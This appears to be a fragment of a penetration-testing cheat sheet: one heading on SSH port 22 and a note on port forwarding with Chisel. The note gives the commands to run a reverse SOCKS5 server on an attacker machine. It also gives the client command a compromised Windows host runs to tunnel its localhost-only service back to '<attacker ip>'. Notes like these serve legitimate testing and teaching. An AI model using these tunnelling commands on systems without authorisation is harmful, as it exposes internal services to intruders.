item.title: Pentest - SSH p 22

item.title: Port Forwarding
item.description: Port Forwarding Chisel Compromised windows machine – service hosted only at 127.0.0.1 – attacker machine is server and victim machine is client: 1 2 3 4 # attacker chisel server --socks5 --reverse -p 1234 # windows victim chiselx86_64.exe client <attacker ip>:1234 R:9090:127.0.0.1:9090
